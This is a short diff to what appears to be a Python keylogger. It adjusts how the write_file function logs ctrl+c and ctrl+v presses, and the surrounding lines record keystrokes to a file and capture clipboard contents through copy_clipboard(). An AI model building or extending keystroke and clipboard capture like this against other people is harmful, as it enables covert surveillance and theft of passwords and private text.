@@ -85,10 +85,10 @@ def write_file(keys):
             if key==Key.space:
                 f.write(' [space] ')
             elif hasattr(key, 'char') and key.char == '\x03':
-                f.write("ctrl+c")
+                f.write("ctrl+c\n")
                 copy_clipboard()
             elif hasattr(key, 'char') and key.char == '\x16':
-                f.write("ctrl+v")
+                f.write("ctrl+v\n")
                 copy_clipboard()
             elif key==Key.shift or key == Key.shift_l or key == Key.shift_r:
                 f.write(" [shift] \n")
